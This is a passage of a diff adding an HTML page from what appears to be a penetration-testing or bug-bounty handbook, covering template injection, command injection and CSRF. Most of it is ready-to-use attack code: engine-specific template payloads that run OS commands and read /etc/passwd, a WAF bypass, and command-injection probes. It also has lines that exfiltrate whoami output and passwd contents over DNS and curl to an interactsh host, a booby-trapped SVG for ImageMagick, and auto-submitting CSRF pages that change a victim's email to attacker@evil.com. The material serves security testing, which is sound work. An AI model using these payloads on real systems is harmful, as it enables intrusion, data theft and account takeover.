+<td>Twig</td>
+</tr>
+<tr>
+<td><code>{7*7}</code></td>
+<td><code>49</code></td>
+<td>Smarty</td>
+</tr>
+<tr>
+<td><code>@(7*7)</code></td>
+<td><code>49</code></td>
+<td>Razor (.NET)</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="432-rce-payloads-by-engine">4.3.2 RCE Payloads by Engine<a class="headerlink" href="#432-rce-payloads-by-engine" title="Permanent link">&para;</a></h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="4:4"><input checked="checked" id="__tabbed_4_1" name="__tabbed_4" type="radio" /><input id="__tabbed_4_2" name="__tabbed_4" type="radio" /><input id="__tabbed_4_3" name="__tabbed_4" type="radio" /><input id="__tabbed_4_4" name="__tabbed_4" type="radio" /><div class="tabbed-labels"><label for="__tabbed_4_1">Jinja2 (Python/Flask)</label><label for="__tabbed_4_2">Twig (PHP)</label><label for="__tabbed_4_3">FreeMarker (Java)</label><label for="__tabbed_4_4">ERB (Ruby)</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-python highlight"><span class="filename">jinja2_rce.py</span><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="c1"># Read /etc/passwd:</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="p">{{</span><span class="n">config</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="p">[</span><span class="s1">&#39;os&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat /etc/passwd&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="c1"># Via cycler (Flask-specific, shorter):</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="p">{{</span><span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()}}</span>
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="c1"># WAF bypass — use |attr() filter if __class__ is blocked:</span>
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="p">()</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__class__&#39;</span><span class="p">)</span><span class="o">|</span><span class="n">attr</span><span class="p">(</span><span class="s1">&#39;__mro__&#39;</span><span class="p">)</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-php highlight"><span class="filename">twig_rce.php</span><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="x">{{_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)}}</span>
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="x">{{_self.env.getFilter(&quot;id&quot;)}}</span>
+</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>
+</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="x">// Or:</span>
+</span><span id="__span-34-5"><a id="__codelineno-34-5" name="__codelineno-34-5" href="#__codelineno-34-5"></a><span class="x">{{[&#39;id&#39;]|filter(&#39;system&#39;)}}</span>
+</span><span id="__span-34-6"><a id="__codelineno-34-6" name="__codelineno-34-6" href="#__codelineno-34-6"></a><span class="x">{{[&#39;cat /etc/passwd&#39;]|filter(&#39;passthru&#39;)}}</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-java highlight"><span class="filename">freemarker_rce.java</span><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="o">&lt;</span><span class="err">#</span><span class="n">assign</span><span class="w"> </span><span class="n">ex</span><span class="o">=</span><span class="s">&quot;freemarker.template.utility.Execute&quot;</span><span class="o">?</span><span class="k">new</span><span class="p">()</span><span class="o">&gt;</span>
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="n">$</span><span class="p">{</span><span class="n">ex</span><span class="p">(</span><span class="s">&quot;id&quot;</span><span class="p">)}</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-ruby highlight"><span class="filename">erb_rce.rb</span><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="o">&lt;</span><span class="sx">%= `id` %&gt;</span>
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="sx">&lt;%=</span><span class="w"> </span><span class="no">IO</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="w"> </span><span class="o">%&gt;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Confirm blind SSTI with OOB first</p>
+<p>Use DNS callback via interactsh before attempting RCE. Confirms execution without risking crashes or triggering WAF alerts on more aggressive payloads.</p>
+</div>
+<div class="language-bash highlight"><span class="filename">sstimalp_scan.sh</span><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="c1"># SSTImap — automated detection and exploitation</span>
+</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a>python3<span class="w"> </span>sstimap.py<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;https://target.com/page?name=test&quot;</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a><span class="w">  </span>--crawl<span class="w"> </span>--cookie<span class="w"> </span><span class="s2">&quot;session=&lt;token&gt;&quot;</span>
+</span></code></pre></div>
+<hr />
+<h3 id="433-ssti-checklist">4.3.3 SSTI Checklist<a class="headerlink" href="#433-ssti-checklist" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>□ Polyglot probe in every user-controlled field that renders in response
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>□ Math probe: {{7*7}}, ${7*7}, &lt;%= 7*7 %&gt;
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>□ 49 appears in response → confirmed
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>□ Identify engine via differentiation probes
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>□ Blind SSTI: OOB (DNS via interactsh) before RCE attempt
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a>□ Check sandboxed vs. unsandboxed Jinja2 configs
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>□ For PoC: show id or hostname output — stop there, no full shell
+</span></code></pre></div>
+<hr />
+<h2 id="44-command-injection">4.4 Command Injection<a class="headerlink" href="#44-command-injection" title="Permanent link">&para;</a></h2>
+<p>The application passes user input to an OS shell command without sanitization. The attacker appends shell operators to inject additional commands. Impact: RCE — typically Critical.</p>
+<h3 id="441-detection-probes">4.4.1 Detection Probes<a class="headerlink" href="#441-detection-probes" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">cmdi_probes.sh</span><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="c1"># Append after normal input — one of these will work:</span>
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>test<span class="p">;</span>id
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>test<span class="o">&amp;&amp;</span>id
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>test<span class="o">||</span>id
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>test<span class="p">|</span>id
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a><span class="nb">test</span><span class="sb">`</span>id<span class="sb">`</span>
+</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>test<span class="k">$(</span>id<span class="k">)</span>
+</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>test%0aid<span class="w">       </span><span class="c1"># newline separator</span>
+</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>
+</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a><span class="c1"># Blind — time-based confirmation:</span>
+</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a>test<span class="p">;</span>sleep<span class="w"> </span><span class="m">5</span>
+</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a>test<span class="o">&amp;&amp;</span>sleep<span class="w"> </span><span class="m">5</span>
+</span><span id="__span-39-13"><a id="__codelineno-39-13" name="__codelineno-39-13" href="#__codelineno-39-13"></a>test<span class="k">$(</span>sleep<span class="w"> </span><span class="m">5</span><span class="k">)</span>
+</span><span id="__span-39-14"><a id="__codelineno-39-14" name="__codelineno-39-14" href="#__codelineno-39-14"></a>
+</span><span id="__span-39-15"><a id="__codelineno-39-15" name="__codelineno-39-15" href="#__codelineno-39-15"></a><span class="c1"># Confirm timing:</span>
+</span><span id="__span-39-16"><a id="__codelineno-39-16" name="__codelineno-39-16" href="#__codelineno-39-16"></a><span class="nb">time</span><span class="w"> </span>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://target.com/api/ping?host=127.0.0.1;sleep+5&quot;</span>
+</span><span id="__span-39-17"><a id="__codelineno-39-17" name="__codelineno-39-17" href="#__codelineno-39-17"></a><span class="c1"># real 5.1s → confirmed</span>
+</span></code></pre></div>
+<hr />
+<h3 id="442-blind-oob-exfiltration">4.4.2 Blind OOB Exfiltration<a class="headerlink" href="#442-blind-oob-exfiltration" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><span class="filename">cmdi_oob.sh</span><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1"># Start listener:</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>interactsh-client<span class="w"> </span>-server<span class="w"> </span>interactsh.com<span class="w"> </span>-token<span class="w"> </span>&lt;token&gt;
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="c1"># Get: abc123.interactsh.com</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a><span class="c1"># DNS callback payloads — inject after normal input:</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="p">;</span><span class="w"> </span>nslookup<span class="w"> </span><span class="k">$(</span>whoami<span class="k">)</span>.abc123.interactsh.com
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="p">;</span><span class="w"> </span>curl<span class="w"> </span>http://abc123.interactsh.com/<span class="k">$(</span>whoami<span class="k">)</span>
+</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a><span class="p">;</span><span class="w"> </span>host<span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-1<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span>-d<span class="w"> </span><span class="s1">&#39;\n&#39;</span><span class="k">)</span>.abc123.interactsh.com
+</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a>
+</span><span id="__span-40-10"><a id="__codelineno-40-10" name="__codelineno-40-10" href="#__codelineno-40-10"></a><span class="c1"># Attacker receives: root.abc123.interactsh.com → confirms root execution</span>
+</span></code></pre></div>
+<hr />
+<h3 id="443-hidden-attack-surfaces">4.4.3 Hidden Attack Surfaces<a class="headerlink" href="#443-hidden-attack-surfaces" title="Permanent link">&para;</a></h3>
+<p>Features that commonly invoke OS commands — check all of these:</p>
+<table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>Vector</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ping / traceroute functionality</td>
+<td><code>host=127.0.0.1;id</code></td>
+</tr>
+<tr>
+<td>DNS lookup features</td>
+<td>Hostname parameter</td>
+</tr>
+<tr>
+<td>File conversion (ImageMagick, ffmpeg)</td>
+<td>Filename, metadata</td>
+</tr>
+<tr>
+<td>Archive creation / extraction</td>
+<td>Filename parameter</td>
+</tr>
+<tr>
+<td>"Send test email"</td>
+<td>Server hostname field</td>
+</tr>
+<tr>
+<td>PDF / document generation</td>
+<td>Header injection → command</td>
+</tr>
+<tr>
+<td>Build / deployment hooks</td>
+<td>Any trigger parameter</td>
+</tr>
+<tr>
+<td>Server status / health check pages</td>
+<td>Any query parameter</td>
+</tr>
+</tbody>
+</table>
+<div class="language-bash highlight"><span class="filename">imagemagick_cmdi.sh</span><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1"># Malicious SVG for ImageMagick processing:</span>
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>payload.svg<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="s">&lt;?xml version=&quot;1.0&quot; standalone=&quot;no&quot;?&gt;</span>
+</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="s">&lt;!DOCTYPE svg PUBLIC &quot;-//W3C//DTD SVG 1.1//EN&quot;</span>
+</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="s">&quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&quot;&gt;</span>
+</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="s">&lt;svg width=&quot;200px&quot; height=&quot;200px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;</span>
+</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="s">xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;&gt;</span>
+</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="s">&lt;image xlink:href=&quot;https://example.com/image.jpg`nslookup abc123.interactsh.com`&quot;</span>
+</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="s">x=&quot;0&quot; y=&quot;0&quot; height=&quot;200px&quot; width=&quot;200px&quot;/&gt;</span>
+</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="s">&lt;/svg&gt;</span>
+</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a><span class="s">EOF</span>
+</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a><span class="c1"># Upload to any image processing endpoint</span>
+</span></code></pre></div>
+<hr />
+<h2 id="45-cross-site-request-forgery-csrf">4.5 Cross-Site Request Forgery (CSRF)<a class="headerlink" href="#45-cross-site-request-forgery-csrf" title="Permanent link">&para;</a></h2>
+<p>A malicious page causes a victim's browser to send a state-changing request to a target site where the victim is authenticated. The browser includes cookies automatically — the server can't distinguish legitimate requests from forged ones.</p>
+<h3 id="451-detection">4.5.1 Detection<a class="headerlink" href="#451-detection" title="Permanent link">&para;</a></h3>
+<p><strong>An endpoint is vulnerable when all three are true:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>1. It performs a state-changing action (not just reading data)
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>2. It relies solely on cookies/session for authentication
+</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a>3. It has no valid CSRF defense
+</span></code></pre></div>
+<p><strong>Testing existing defenses:</strong></p>
+<div class="language-bash highlight"><span class="filename">csrf_token_bypass.sh</span><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1"># If token present — test these bypasses:</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="c1"># 1. Remove the token entirely:</span>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>POST<span class="w"> </span>/api/email/change
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="nv">email</span><span class="o">=</span>attacker@evil.com
+</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="c1"># (no csrf_token parameter at all)</span>
+</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>
+</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="c1"># 2. Empty token:</span>
+</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a><span class="nv">csrf_token</span><span class="o">=</span>
+</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a>
+</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a><span class="c1"># 3. Random value (same length):</span>
+</span><span id="__span-43-12"><a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a><span class="nv">csrf_token</span><span class="o">=</span>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span><span id="__span-43-13"><a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a>
+</span><span id="__span-43-14"><a id="__codelineno-43-14" name="__codelineno-43-14" href="#__codelineno-43-14"></a><span class="c1"># 4. Your own token for victim&#39;s session:</span>
+</span><span id="__span-43-15"><a id="__codelineno-43-15" name="__codelineno-43-15" href="#__codelineno-43-15"></a><span class="c1"># Get a valid token from your session → use in request with victim&#39;s cookie</span>
+</span><span id="__span-43-16"><a id="__codelineno-43-16" name="__codelineno-43-16" href="#__codelineno-43-16"></a><span class="c1"># If accepted → token not tied to session</span>
+</span></code></pre></div>
+<hr />
+<h3 id="452-poc-construction">4.5.2 PoC Construction<a class="headerlink" href="#452-poc-construction" title="Permanent link">&para;</a></h3>
+<div class="tabbed-set tabbed-alternate" data-tabs="5:3"><input checked="checked" id="__tabbed_5_1" name="__tabbed_5" type="radio" /><input id="__tabbed_5_2" name="__tabbed_5" type="radio" /><input id="__tabbed_5_3" name="__tabbed_5" type="radio" /><div class="tabbed-labels"><label for="__tabbed_5_1">Standard HTML form</label><label for="__tabbed_5_2">JSON CSRF</label><label for="__tabbed_5_3">GET-based</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="language-html highlight"><span class="filename">csrf_poc.html</span><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;csrf&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://target.com/api/user/email&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;attacker@evil.com&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;confirm_email&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;attacker@evil.com&quot;</span> <span class="p">/&gt;</span>
+</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span><span id="__span-44-7"><a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>  <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;csrf&#39;</span><span class="p">).</span><span class="nx">submit</span><span class="p">();&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-44-8"><a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-44-9"><a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-html highlight"><span class="filename">json_csrf_poc.html</span><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="cm">&lt;!-- text/plain bypass — body becomes valid JSON --&gt;</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;https://target.com/api/settings&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span>
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>  <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;text/plain&quot;</span><span class="p">&gt;</span>
+</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>  <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#39;{&quot;email&quot;:&quot;attacker@evil.com&quot;,&quot;x&quot;:&quot;&#39;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#39;&quot;}&#39;</span> <span class="p">/&gt;</span>
+</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>
+</span><span id="__span-45-7"><a id="__codelineno-45-7" name="__codelineno-45-7" href="#__codelineno-45-7"></a><span class="cm">&lt;!-- fetch() — only works if CORS is misconfigured (application/json triggers preflight) --&gt;</span>
+</span><span id="__span-45-8"><a id="__codelineno-45-8" name="__codelineno-45-8" href="#__codelineno-45-8"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-45-9"><a id="__codelineno-45-9" name="__codelineno-45-9" href="#__codelineno-45-9"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://target.com/api/settings&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-45-10"><a id="__codelineno-45-10" name="__codelineno-45-10" href="#__codelineno-45-10"></a><span class="w">  </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
+</span><span id="__span-45-11"><a id="__codelineno-45-11" name="__codelineno-45-11" href="#__codelineno-45-11"></a><span class="w">  </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;include&#39;</span><span class="p">,</span>
+</span><span id="__span-45-12"><a id="__codelineno-45-12" name="__codelineno-45-12" href="#__codelineno-45-12"></a><span class="w">  </span><span class="nx">mode</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;no-cors&#39;</span><span class="p">,</span>
+</span><span id="__span-45-13"><a id="__codelineno-45-13" name="__codelineno-45-13" href="#__codelineno-45-13"></a><span class="w">  </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="nx">email</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;attacker@evil.com&#39;</span><span class="p">})</span>
+</span><span id="__span-45-14"><a id="__codelineno-45-14" name="__codelineno-45-14" href="#__codelineno-45-14"></a><span class="p">})</span>
+</span><span id="__span-45-15"><a id="__codelineno-45-15" name="__codelineno-45-15" href="#__codelineno-45-15"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+</div>
+<div class="tabbed-block">
+<div class="language-html highlight"><span class="filename">get_csrf_poc.html</span><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="cm">&lt;!-- For GET-based state changes (rare but exists) --&gt;</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://target.com/api/user/delete?confirm=true&quot;</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;display:none&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div>
+</div>
+</div>
+</div>
+<hr />
+<h3 id="453-samesite-bypass">4.5.3 SameSite Bypass<a class="headerlink" href="#453-samesite-bypass" title="Permanent link">&para;</a></h3>
+<table>
+<thead>
+<tr>
+<th>Cookie Attribute</th>
+<th>Cross-site POST</th>
+<th>Top-level GET navigation</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SameSite=None</code></td>
+<td>Sent</td>
+<td>Sent</td>
+<td>Fully vulnerable</td>
+</tr>
+<tr>
+<td><code>SameSite=Lax</code></td>
+<td>Blocked</td>
+<td>Sent</td>
+<td>GET-based state changes still vulnerable</td>
+</tr>
+<tr>
+<td><code>SameSite=Strict</code></td>
+<td>Blocked</td>
+<td>Blocked</td>
+<td>Near-impossible without subdomain XSS</td>
+</tr>
+<tr>
+<td>Not set (Chrome default)</td>
+<td>Blocked (Lax behavior)</td>
+<td>Sent</td>
+<td>Same as Lax</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Bypasses for Lax/Strict:</strong></p>
